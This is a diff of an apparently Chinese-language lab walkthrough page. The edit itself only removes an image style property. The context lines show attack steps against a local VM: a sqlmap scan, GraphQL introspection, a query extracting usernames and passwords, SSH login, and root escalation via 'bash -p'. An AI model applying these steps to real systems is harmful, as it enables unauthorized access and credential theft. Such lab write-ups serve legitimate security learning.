@@ -173,7 +173,7 @@ Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.43 se
 </pre></div>
 <p>先看<strong>80端口</strong>，<strong>22端口</strong>候补</p>
 <h1>2.踩点</h1>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b9a4753b-3614-43d8-adff-220881ce04cd"><img src="https://github.com/user-attachments/assets/b9a4753b-3614-43d8-adff-220881ce04cd" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b9a4753b-3614-43d8-adff-220881ce04cd"><img src="https://github.com/user-attachments/assets/b9a4753b-3614-43d8-adff-220881ce04cd" alt="Image" style="max-width: 100%;"></a></p>
 <p>一个查询页面，可以输入数值进行查询，有效范围是<strong>1-99</strong>，后面的数据是重复的。尝试sql注入</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ sqlmap -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.138<span class="pl-pds">"</span></span> --forms --batch 
@@ -239,9 +239,9 @@ Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.43 se
 [http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.138
 [tech-detect:express] [http] [info] http://192.168.205.138                                                                       </pre></div>
 <p>可以看到和<strong>graphql</strong>有关，去<a href="https://book.hacktricks.wiki/" rel="nofollow">hacktricks</a>搜索会有一篇<a href="https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-web/graphql.html" rel="nofollow">相关的文章</a></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3b901b4a-7b70-4115-8e9a-bcef0a17dea1"><img src="https://github.com/user-attachments/assets/3b901b4a-7b70-4115-8e9a-bcef0a17dea1" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3b901b4a-7b70-4115-8e9a-bcef0a17dea1"><img src="https://github.com/user-attachments/assets/3b901b4a-7b70-4115-8e9a-bcef0a17dea1" alt="Image" style="max-width: 100%;"></a></p>
 <p>进行尝试</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/a06c32f3-66b7-473e-a0e7-454b5b7d3c9a"><img src="https://github.com/user-attachments/assets/a06c32f3-66b7-473e-a0e7-454b5b7d3c9a" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/a06c32f3-66b7-473e-a0e7-454b5b7d3c9a"><img src="https://github.com/user-attachments/assets/a06c32f3-66b7-473e-a0e7-454b5b7d3c9a" alt="Image" style="max-width: 100%;"></a></p>
 <p>确实是<strong>GraphQL</strong>服务，进一步测试</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">POST /graphql HTTP/1.1
 Host: 192.168.205.138
@@ -259,13 +259,13 @@ Connection: keep-alive
 Priority: u=0
 
 {<span class="pl-s"><span class="pl-pds">"</span>query<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}<span class="pl-pds">"</span></span>}</pre></div>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/25ee0763-bd8d-4e53-81de-e184768478c5"><img src="https://github.com/user-attachments/assets/25ee0763-bd8d-4e53-81de-e184768478c5" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/25ee0763-bd8d-4e53-81de-e184768478c5"><img src="https://github.com/user-attachments/assets/25ee0763-bd8d-4e53-81de-e184768478c5" alt="Image" style="max-width: 100%;"></a></p>
 <p>存在<strong>用户名</strong>和<strong>密码</strong>，我们尝试提取</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">省略
 {<span class="pl-s"><span class="pl-pds">"</span>query<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>{users(id: 1) {username   password }}<span class="pl-pds">"</span></span>}</pre></div>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/542a96c5-7747-4a97-8c78-0c4adbb94eab"><img src="https://github.com/user-attachments/assets/542a96c5-7747-4a97-8c78-0c4adbb94eab" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/542a96c5-7747-4a97-8c78-0c4adbb94eab"><img src="https://github.com/user-attachments/assets/542a96c5-7747-4a97-8c78-0c4adbb94eab" alt="Image" style="max-width: 100%;"></a></p>
 <p>拿去爆破模块爆破</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/2a021d44-95ea-429a-ac13-351c6317f026"><img src="https://github.com/user-attachments/assets/2a021d44-95ea-429a-ac13-351c6317f026" alt="Image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/2a021d44-95ea-429a-ac13-351c6317f026"><img src="https://github.com/user-attachments/assets/2a021d44-95ea-429a-ac13-351c6317f026" alt="Image" style="max-width: 100%;"></a></p>
 <p>尝试登录ssh</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ ssh malo@192.168.205.138                        
@@ -579,7 +579,7 @@ Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkMa
 ╰─$ bash -p                                 
 bash-5.2# id
 uid=1001(sophie) gid=1001(sophie) euid=0(root) groups=1001(sophie),100(users)</pre></div>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6adbe1c8-e9d6-4394-a24d-345116fda9f7"><img src="https://github.com/user-attachments/assets/6adbe1c8-e9d6-4394-a24d-345116fda9f7" alt="Image" style="max-width: 100%; height: auto;"></a></p></div>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6adbe1c8-e9d6-4394-a24d-345116fda9f7"><img src="https://github.com/user-attachments/assets/6adbe1c8-e9d6-4394-a24d-345116fda9f7" alt="Image" style="max-width: 100%;"></a></p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
